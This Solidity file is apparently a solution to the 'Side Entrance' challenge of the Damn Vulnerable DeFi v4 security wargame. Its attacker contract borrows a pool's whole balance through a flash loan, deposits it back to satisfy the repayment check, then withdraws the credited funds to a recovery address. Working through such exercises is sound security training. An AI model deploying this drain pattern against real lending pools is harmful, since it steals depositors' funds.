// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {console} from "forge-std/Test.sol";

interface ISideEntranceLenderPool {
    function deposit() external payable;

    function withdraw() external;

    function flashLoan(uint256 amount) external;
}

contract Attacker {
    address immutable recovery;
    ISideEntranceLenderPool immutable victim;

    constructor(address _recovery, address _victim) {
        recovery = _recovery;
        victim = ISideEntranceLenderPool(_victim);
    }

    function attack() external {
        victim.flashLoan(address(victim).balance);
    }

    function execute() external payable {
        victim.deposit{value: msg.value}();
    }

    function withdraw() external {
        victim.withdraw();

        payable(recovery).call{value: address(this).balance}("");
    }

    receive() external payable {}
}
